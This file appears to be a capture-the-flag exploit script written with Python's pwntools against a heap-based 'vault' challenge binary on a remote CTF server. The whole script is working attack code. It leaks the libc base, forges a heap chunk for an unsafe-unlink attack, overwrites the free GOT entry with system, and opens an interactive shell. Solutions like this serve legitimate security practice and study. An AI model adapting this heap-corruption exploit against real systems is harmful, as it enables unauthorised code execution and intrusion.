#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 10252
HOST = "play.scriptsorcerers.xyz"
exe = context.binary = ELF('./vault_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x000000000040146E
            b* 0x0000000000401510
            b* 0x0000000000401349
            b* _int_free
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add(idx):
    p.sendlineafter(b'> ', str(1))
    p.sendlineafter(b'create? ', str(idx))

def store(idx, data):
    p.sendlineafter(b'> ', str(2))
    p.sendline(str(idx))
    p.sendafter(b'vault? ', data)

def free(idx):
    p.sendlineafter(b'> ', str(3))
    p.sendlineafter(b'free? ', str(idx))

# VARIABLE
vaults = 0x404090
rw_section = 0x404a00

# PAYLOAD
p.recvuntil(b'is ')
libc_leak = int(p.recvuntil(b'\n', drop=True), 16)
libc.address = libc_leak - libc.sym.puts
log.info("Libc base: " + hex(libc.address))

add(0)
add(1)
payload = flat(
    0, 0x81,
    vaults - 0x18, vaults - 0x10
    )
payload = payload.ljust(0x80, b'\0') + p64(0x80) + p64(0x90)
store(0, payload)
# GDB()
free(1) # ptr_chunk2 - prev_size = ptr_chunk1 -> unlink(ptr_chunk1)

payload = flat(
    b'\0'*0x18, exe.got.free,
    )
store(0, payload)
store(0, p64(libc.sym.system))
store(1, b'/bin/sh\0')

free(1)

p.interactive()